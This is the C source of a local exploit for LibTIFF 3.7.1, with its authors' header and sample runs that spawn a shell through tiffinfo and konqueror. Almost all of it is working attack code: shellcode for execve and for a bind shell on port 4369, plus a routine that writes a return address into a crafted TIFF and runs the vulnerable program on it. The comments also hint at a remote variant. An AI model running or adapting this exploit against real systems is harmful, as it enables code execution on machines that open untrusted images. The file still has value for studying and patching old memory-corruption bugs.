/*
 LibTIFF exploit
 Tested on LibTIFF 3.7.1
 Coded by Agustin Gianni (agustingianni at gmail.com) and Samelat

 Blog: http://gruba.blogspot.com
  
 In other versions and/or Linux distributions you might need to
 adjust some offsets.

 gr00vy@kenny:/home/gr00vy/EXPLOIT$ make libtiff_exploit
 cc libtiff_exploit.c -o libtiff_exploit
 gr00vy@kenny:/home/gr00vy/EXPLOIT$ ./libtiff_exploit /usr/local/bin/tiffinfo evil.tiff
 Using RET: 0xbfffffb4
 TIFFReadDirectory:
 Warning, evil.tiff: unknown field with tag 260 (0x104) encountered.
 evil.tiff:
 Warning, incorrect count for field &quot;PhotometricInterpretation&quot; (150341633, expecting 1); tag trimmed.
 evil.tiff:
 Warning, incorrect count for field &quot;BitsPerSample&quot; (257, expecting 1); tag trimmed.
 sh-3.00$

 gr00vy@kenny:/home/gr00vy/storage/Exploits/Libtiff-3.7.1$ ./libtiff_exploit
 /usr/kde/3.3/bin/konqueror evil.tiff
 Linux Enabled
 Using RET: 0xbfffffb1
 konqueror: ERROR: Error in BrowserExtension::actionSlotMap(), unknown action : searchProvider
 konqueror: ERROR: Error in BrowserExtension::actionSlotMap(), unknown action : searchProvider
 TIFFReadDirectory: Warning, : unknown field with tag 260 (0x104) encountered.
 : Warning, incorrect count for field &quot;PhotometricInterpretation&quot; (150341633, expecting 1);
 tag
 trimmed.
 : Warning, incorrect count for field &quot;BitsPerSample&quot; (257, expecting 1); tag trimmed.
 sh-3.00$ exit
 exit

 Heheh it also works like a remote exploit i would leave that work (easy work) for the
 &quot;interested&quot; people.

*/

#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;

#define OFFSET 0x3F /* return address offset */
#define SHELL_OFFSET 0x0102 /* shellcode address offset */
#define DISPLAY &quot;DISPLAY=:0.0&quot; /* no comments ... */
#define HOMEDIR &quot;HOME=/tmp/&quot;

int
main(int argc, char **argv, char **env)
{
 /* Linux shellcode that binds a shell on port 4369 */
char linux_bind[] = &quot;\x31\xc0\x50\x40\x50\x40\x50\xb0\x66\x31&quot;
  &quot;\xdb\x43\x89\xe1\xcd\x80\x99\x52\x52\x52&quot;
  &quot;\xba\x02\x01\x11\x11\xfe\xce\x52\x89\xe2&quot;
  &quot;\x31\xc9\xb1\x10\x51\x52\x50\x89\xc2\x89&quot;
  &quot;\xe1\xb0\x66\xb3\x02\x89\xe1\xcd\x80\xb0&quot;
  &quot;\x66\xb3\x04\x53\x52\x89\xe1\xcd\x80\x31&quot;
  &quot;\xc0\x50\x50\x52\x89\xe1\xb0\x66\xb3\x05&quot;
  &quot;\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xb0\x3f&quot;
  &quot;\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f&quot;
  &quot;\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51&quot;
  &quot;\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;

 /* (?) lies lies lies lies!*/
 #ifdef FREEBSD
 printf(&quot;FreeBSD Enabled\n&quot;);
 char shellcode[]=
  &quot;\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd&quot;
  &quot;\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot;;
 
 #else
 printf(&quot;Linux Enabled\n&quot;);
 char shellcode[] =
  &quot;\xeb\x20\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c&quot;
  &quot;\x88\x46\x07\x8d\x56\x0c\x8d\x4e\x08\x89\xf3&quot;
  &quot;\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd&quot;
  &quot;\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f&quot;
  &quot;\x73\x68\x23&quot;;
 
 #endif

 if(argc &lt; 3)
 {
  fprintf(stderr, &quot;Error, arguments are like these\n&quot;
    &quot;%s &lt;path_to_vuln&gt; &lt;eviltiff.tiff&gt;\n&quot;, argv[0]);
  return -1;
 }
 
 char *envp[] = {HOMEDIR, DISPLAY, shellcode, NULL};
 
 /* argv[1] -&gt; executable file that is linked with vuln tiff library */
 long ret = 0xc0000000 - sizeof(void *) - strlen(argv[1]) - strlen(shellcode) - 0x02;
 
 int fd = open(argv[2], O_RDWR);
 if(fd == -1)
 {
  perror(&quot;open()&quot;);
  return -1;
 }
 
 if(lseek(fd, OFFSET, SEEK_SET) == -1)
 {
  perror(&quot;lseek()&quot;);
  close(fd);
  return -1;
 }
 
 if(write(fd, (void *) &amp;ret, sizeof(long)) &lt; sizeof(long))
 {
  perror(&quot;write()&quot;);
  close(fd);
  return -1;
 }
 
 close(fd);
 
 fprintf(stdout, &quot;Using RET: 0x%.8x\n&quot;, (unsigned int) ret);
 
 if(execle(argv[1], &quot;tiff&quot;, argv[2], NULL, envp) == -1)
 {
  perror(&quot;execve()&quot;);
  return -1;
 }
 
 return 0;
}

